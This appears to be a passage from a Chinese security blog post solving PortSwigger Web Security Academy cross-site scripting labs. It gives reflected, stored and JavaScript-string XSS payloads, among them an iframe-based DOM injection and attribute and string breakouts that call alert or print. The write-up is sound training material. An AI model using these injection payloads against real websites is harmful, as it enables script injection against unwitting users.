+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0a1d00120321917c80bd0301008f001b.web-security-academy.net/#&quot; onload=&quot;this.src+=&#x27;&lt;img src=1 onerror=print()&gt;&#x27;&quot; hidden=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们把这个挂在服务器上，发给用户就行了</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091245929.png" alt="image-20250909124547800"></p>
+<h3 id="Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="Lab: Reflected XSS into attribute with angle brackets HTML-encoded"></a>Lab: Reflected XSS into attribute with angle brackets HTML-encoded</h3><blockquote>
+<p>This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.</p>
+<p>这个实验在博客搜索功能中存在一个反射型跨站脚本漏洞，其中尖括号会被 HTML 编码。要解决这个实验，请实施一次跨站脚本攻击，注入一个属性并调用 alert 函数。</p>
+</blockquote>
+<p>我们继续输入 she11f 然后全局搜索一下，发现写进了 input 标签的 value 属性里面</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509092235316.png" alt="image-20250909223543226"></p>
+<p>因为尖括号会被 HTML 编码，所以我们可以闭合 value 属性，然后绑定一个事件触发它来实现 alert 函数的调用，可以查询 xss 速查表</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet%EF%BC%8C%E6%89%BE%E5%88%B0">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet，找到</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xss onfocus=alert(1) autofocus tabindex=1&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onfocus=alert(1) autofocus &quot;</span><br><span class="line">&quot;onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>Lab: Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</h3><blockquote>
+<p>This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. </p>
+<p>这个实验在评论功能中存在一个存储型跨站脚本漏洞。要解决这个实验，请提交一条评论，使得当点击评论的作者名称时，会调用 alert 函数。</p>
+</blockquote>
+<p>看题目描述和题目名，应该是要给 href 属性调用 js 伪协议触发 alert 事件了。</p>
+<p>根据题目描述我们在帖子评论区填入 she11f 看一看,记得是 website 那里填入才是 a 标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;author&quot; href=&quot;she11f&quot;&gt;she11f&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Payload </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</h3><blockquote>
+<p>This lab contains a reflected cross-site scripting vulnerability in the  search query tracking functionality where angle brackets are encoded.  The reflection occurs inside a JavaScript string. To solve this lab,  perform a cross-site scripting attack that breaks out of the JavaScript  string and calls the <code>alert</code> function.</p>
+<p>此实验包含一个反射型跨站脚本漏洞，该漏洞存在于搜索查询跟踪功能中，其中尖括号被编码。反射发生在 JavaScript 字符串内部。要解决此实验，请执行一次跨站脚本攻击，突破 JavaScript 字符串的限制并调用 alert 函数。</p>
+</blockquote>
+<p>依旧输入一个 she11f ，全局搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var searchTerms = &#x27;she11f&#x27;;</span><br><span class="line">document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+encodeURIComponent(searchTerms)+&#x27;&quot;&gt;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>在一段 javasript 内部发现了我们的字符串，很明显了，我们得闭合单引号写入 js 代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">she11f&#x27;; alert(1); /*</span><br><span class="line">she11f&#x27;; alert(1); //</span><br><span class="line">she11f&#x27;; alert(1);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>还有就是 js 是动态语言，我们可以利用字符串拼接来实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+alert(2)+&#x27;</span><br><span class="line">var searchTerms = &#x27;&#x27;+alert(2)+&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>也可以，-和+是一个道理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-alert(1)-&#x27;</span><br><span class="line">var searchTerms = &#x27;&#x27;-alert(1)-&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/&title= - sleeper&summary=1234menu_id: moretitle: PortSwigger XSScategories: [PortSwigger,XSS]tags: [PortSwigger,XSS]
+
+
+
+Cross-site scriptingLa..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject= - sleeper&amp;body=http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=http://example.com/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/05/10/%E9%9D%B6%E5%9C%BA/%E7%8E%84%E6%9C%BA/1/">第一章 应急响应-webshell查杀</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">she11f</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-site-scripting"><span class="toc-text">Cross-site scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded"><span class="toc-text">Lab: Reflected XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Stored-XSS-into-HTML-context-with-nothing-encoded"><span class="toc-text">Lab: Stored XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-document-write-sink-using-source-location-search"><span class="toc-text">Lab: DOM XSS in document.write sink using source location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><span class="toc-text">Lab: DOM XSS in innerHTML sink using source location.search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><span class="toc-text">Lab: DOM XSS in jQuery anchor href attribute sink using location.search source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><span class="toc-text">Lab: DOM XSS in jQuery selector sink using a hashchange event</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><span class="toc-text">Lab: Reflected XSS into attribute with angle brackets HTML-encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><span class="toc-text">Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><span class="toc-text">Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+<!-- required -->
+<script src="/js/main.js?v=1.29.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
